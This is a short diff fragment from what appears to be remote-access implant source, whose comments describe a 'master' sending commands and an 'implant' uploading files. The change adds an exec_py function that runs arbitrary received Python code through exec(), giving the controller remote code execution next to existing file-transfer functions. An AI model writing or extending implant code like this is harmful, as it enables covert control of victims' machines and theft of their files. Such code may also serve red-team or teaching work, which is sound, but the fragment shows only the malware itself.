@@ -59,6 +59,9 @@ def send_file(filename, url=None):
     except Exception as e:
         print_debug(e)
 
+def exec_py(cmd):
+    exec(cmd)
+
 # Master types "download". This function fulfills the command.
 # From the implant's perspective, this is an upload
 def download(filename, url=None):
